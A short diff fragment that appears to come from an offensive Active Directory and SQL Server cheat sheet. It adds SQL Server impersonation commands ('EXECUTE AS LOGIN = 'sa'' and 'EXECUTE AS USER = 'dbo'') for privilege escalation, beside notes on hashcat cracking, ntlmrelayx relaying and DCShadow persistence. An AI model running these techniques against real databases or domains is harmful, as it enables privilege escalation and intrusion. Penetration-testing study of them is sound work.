@@ -1421,6 +1421,15 @@ crack with hashcat:
 
 or use impacket ntlmrelayx to relay pth
 
+#### execute as
+
+```
+EXECUTE AS LOGIN = 'sa';
+
+use msdb; EXECUTE AS USER = 'dbo';
+```
+
+
 # Forest Persistence - DCShadow
 ```Set-DCShadowPermissions```
 
